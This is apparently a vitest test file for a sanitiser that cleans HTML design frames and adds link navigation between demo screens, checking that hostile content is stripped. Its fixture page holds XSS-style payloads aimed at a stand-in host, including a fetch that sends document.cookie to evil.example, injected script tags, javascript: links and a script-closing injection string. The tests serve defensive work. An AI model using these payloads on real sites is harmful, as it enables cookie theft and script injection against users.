import { runInNewContext } from "node:vm";
import { describe, expect, it } from "vitest";
import { liveNames, liveWords, stitchLiveFiles, stitchLiveHtml, LIVE_CSP } from "./stitch-live.js";

const screens = [
  { id: "S-1", route: "/", title: "Desk book", headings: ["Today"] },
  { id: "S-2", route: "/patients", title: "Patients" },
  { id: "S-3", route: "/patients/:id/visits", title: "Visit history" },
];
const page = `<!doctype html><html><head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example">
<script src="https://cdn.tailwindcss.com?plugins=forms"></script><script>tailwind.config = { theme: { extend: {} } }</script>
<script src="https://evil.example/x.js"></script><script>fetch("https://evil.example/" + document.cookie)</script></head>
<body onload="steal()"><nav><a href="javascript:steal()" onclick="steal()">Patients</a><a href="https://evil.example">Out</a></nav>
<iframe src="https://evil.example"></iframe><img src="data:image/png;base64,AAAA"><img src="data:text/html,<script>1</script>"><form action="javascript:steal()"><button>Save</button></form></body></html>`;

describe("a live Stitch page", () => {
  it("keeps Tailwind and its settings and drops everything else that runs or loads a document", () => {
    const html = stitchLiveHtml(page, "S-1", screens);
    expect(html).toContain('src="https://cdn.tailwindcss.com?plugins=forms"');
    expect(html).toContain("tailwind.config = {");
    for (const gone of ["evil.example/x.js", "document.cookie", "onload", "onclick", "javascript:", "<iframe", "<base", "refresh", "data:text/html"]) expect(html).not.toContain(gone);
    expect(html).toContain('src="data:image/png;base64,AAAA"');
    expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="${LIVE_CSP}">`);
    expect(html.indexOf("Content-Security-Policy")).toBeLessThan(html.indexOf("cdn.tailwindcss.com?"));
  });

  it("a script that only looks like Tailwind's settings is dropped", () => {
    const html = stitchLiveHtml(`<html><head><script>tailwind.config = {}; fetch("https://evil.example")</script><script src="https://cdn.tailwindcss.com.evil.example/x.js"></script></head><body></body></html>`, "S-1", screens);
    expect(html).not.toContain("evil.example");
  });

  it("its links open the demo's other screens by name, never its own, and nothing closes the script early", () => {
    expect(liveNames(screens[0]!)).toEqual(["desk book", "today", "home", "dashboard", "overview"]);
    expect(liveNames(screens[2]!)).toEqual(["visit history", "visits", "patients visits"]);
    const html = stitchLiveHtml(page, "S-1", [...screens, { id: "S-4", route: "/x", title: "</script><script>steal()" }]);
    const script = html.slice(html.lastIndexOf("<script>"));
    expect(script).toContain('"id":"S-2","names":["patient"]');
    // its own screen is listed too, so a click that means it stays where it is
    expect(script).toContain('"id":"S-1"');
    expect(script).toContain('M="S-1"');
    expect(script).toContain("parent.postMessage({factoryGo:id}");
    expect(script).not.toContain("</script><script>steal");
  });

  /** Where a click on a control with these words goes, on a screen's live page (undefined: it stays on its page). */
  const goes = (self: string, all: Parameters<typeof stitchLiveHtml>[2], words: string): string | undefined => {
    const html = stitchLiveHtml("<html><body></body></html>", self, all);
    const on: Record<string, (e: unknown) => void> = {};
    let to: string | undefined;
    runInNewContext(html.slice(html.lastIndexOf("<script>") + 8, html.lastIndexOf("</script>")), { document: { addEventListener: (t: string, f: (e: unknown) => void) => { on[t] = f; } }, parent: { postMessage: (m: { factoryGo: string }) => { to = m.factoryGo; } } });
    const el: Record<string, unknown> = { tagName: "BUTTON", cloneNode: () => ({ querySelectorAll: () => [], textContent: words }), getAttribute: () => null };
    el.closest = () => el;
    on.click!({ target: el, preventDefault() {} });
    return to;
  };

  it("follows the links the screen list gave its page first, then what any page calls a screen", () => {
    const linked = [
      { ...screens[0]!, links: [{ label: "Open the register", to: "S-2" }, { label: "Gone", to: "S-9" }] },
      { ...screens[1]!, links: [{ label: "Past visits", to: "S-3" }, { label: "Start", to: "S-1" }] },
      { ...screens[2]!, links: [{ label: "Start", to: "S-2" }] },
    ];
    expect(goes("S-1", linked, "Open the register")).toBe("S-2");
    expect(goes("S-1", linked, "Past visits")).toBe("S-3");
    expect(goes("S-1", linked, "Gone")).toBeUndefined();
    // "Start" means two screens across the pages: only the page that has it follows it
    expect(goes("S-3", linked, "Start")).toBe("S-2");
    expect(goes("S-1", linked, "Start")).toBeUndefined();
  });

  it("guesses a screen by its route's words when no name fits, never for an action or when two screens fit as well", () => {
    const all = [{ id: "S-1", route: "/sign-in", title: "Acme" }, { id: "S-2", route: "/spaces/board", title: "Acme bays" }, { id: "S-3", route: "/guard/verifications", title: "Acme" }, { id: "S-4", route: "/spaces/types", title: "Acme" }];
    expect(liveWords(all[1]!)).toEqual(["space", "board"]);
    expect(goes("S-1", all, "Guard console")).toBe("S-3");
    expect(goes("S-2", all, "Sign out")).toBe("S-1");
    expect(goes("S-1", all, "Help desk")).toBeUndefined();
    expect(goes("S-1", all, "Parking spaces")).toBeUndefined();
    expect(goes("S-1", all.slice(0, 3), "Parking spaces")).toBe("S-2");
    expect(goes("S-1", all.slice(0, 3), "Remove space")).toBeUndefined();
    expect(goes("S-1", all.slice(0, 3), "Error state")).toBeUndefined();
  });

  it("stays on its page when the click means its own screen, and reads a plural as its singular", () => {
    const all = [{ id: "S-1", route: "/dashboard", title: "Good morning" }, { id: "S-2", route: "/dashboard/holder", title: "Hello" }, { id: "S-3", route: "/releases/schedule", title: "Schedule" }, { id: "S-4", route: "/admin/settings", title: "Parking release settings" }, { id: "S-5", route: "/admin/employees", title: "Employees" }, { id: "S-6", route: "/admin/employees/:id", title: "Employee record" }];
    expect(goes("S-1", all, "Dashboard")).toBeUndefined();
    expect(goes("S-3", all, "Dashboard")).toBe("S-1");
    expect(goes("S-1", all, "Release")).toBe("S-3");
    expect(goes("S-3", all, "Release today")).toBeUndefined();
    // a list and its detail page are named by the same route word: the list is meant, from either
    expect(goes("S-6", all, "Employees")).toBe("S-5");
    expect(goes("S-5", all, "All employees")).toBeUndefined();
    expect(goes("S-6", all, "Back to employees")).toBe("S-5");
  });

  it("never takes a switch between a page's states or a footer link for a way to another screen", () => {
    const all = [{ id: "S-1", route: "/sign-in", title: "Acme" }, { id: "S-2", route: "/access-error", title: "Acme" }, { id: "S-3", route: "/admin/spaces", title: "Parking spaces" }];
    expect(goes("S-1", all, "Empty state 0 spaces")).toBeUndefined();
    expect(goes("S-1", all, "Success space B2 14")).toBeUndefined();
    expect(goes("S-1", all, "Terms of access")).toBeUndefined();
    // a screen's exact name still opens it
    expect(goes("S-1", all, "Access error")).toBe("S-2");
    expect(goes("S-1", all, "Manage parking spaces")).toBe("S-3");
    // a one-word name inside a longer control is not a way there, unless the control goes "to" it
    expect(goes("S-1", all, "Claim space")).toBeUndefined();
    expect(goes("S-1", all, "Release today's space")).toBeUndefined();
    expect(goes("S-1", all, "Save and continue to spaces")).toBe("S-3");
  });

  it("one file per frame of a Stitch design, none for another engine or a frame whose HTML is gone", () => {
    const design = { engine: "stitch", screens: screens.map((s) => ({ id: s.id, route: s.route, facts: { title: s.title } })), stitch: { frames: { "ST-1": { screen: "S-1", html: "a" }, "ST-2": { screen: "S-2", html: "gone" }, "../x": { screen: "S-3", html: "a" } } } };
    const get = (sha: string) => { if (sha === "gone") throw new Error("missing"); return Buffer.from(page); };
    const files = stitchLiveFiles(design, get);
    expect(files.map((f) => f.path)).toEqual(["stitch/ST-1.html"]);
    expect(files[0]!.content).toContain("Content-Security-Policy");
    expect(stitchLiveFiles({ ...design, engine: "claude" }, get)).toEqual([]);
  });
});

describe("a Stitch design as a folder of web pages (the HTML export)", () => {
  it("gives each drawn screen and state its own page whose links open the other pages' files, and a contents page", async () => {
    const { stitchSiteFiles } = await import("./stitch-live.js");
    const design = {
      engine: "stitch", screens: [{ id: "S-1", route: "/sign-in" }, { id: "S-2", route: "/orders", facts: { title: "Orders" } }],
      stitch: { frames: { "ST-1": { screen: "S-1", state: "normal" }, "ST-2": { screen: "S-2", state: "normal" }, "ST-3": { screen: "S-2", state: "empty" }, "ST-4": { screen: "S-2", state: "error" } }, links: { "S-1": [{ label: "Continue", to: "S-2" }] } },
    };
    const held: Record<string, string> = { "screens/S-1.html": "<html><body><button onclick=\"x()\">Continue</button><script>alert(1)</script></body></html>", "screens/S-2.html": "<html><body><h1>Orders</h1></body></html>", "screens/S-2-empty.html": "<html><body>None</body></html>" };
    const files = stitchSiteFiles(design, (p) => held[p], "Clinic");
    expect(files.map((f) => f.path)).toEqual(["index.html", "pages/S-1.html", "pages/S-2.html", "pages/S-2-empty.html"]);
    const index = files[0]!.content, s1 = files[1]!.content;
    expect(index).toContain('<a href="pages/S-1.html">page</a>');
    expect(index).toContain('<a href="pages/S-2.html">page</a> <a href="pages/S-2-empty.html">empty</a>');
    expect(index).not.toContain("S-2-error");
    expect(s1).toContain('location.href=id+".html"');
    expect(s1).not.toContain("postMessage");
    expect(s1).not.toContain("alert(1)");
    expect(s1).not.toContain("onclick");
    expect(s1).toContain('"continue":"S-2"');
    expect(stitchSiteFiles({ ...design, engine: "claude" }, (p) => held[p], "Clinic")).toEqual([]);
  });
});
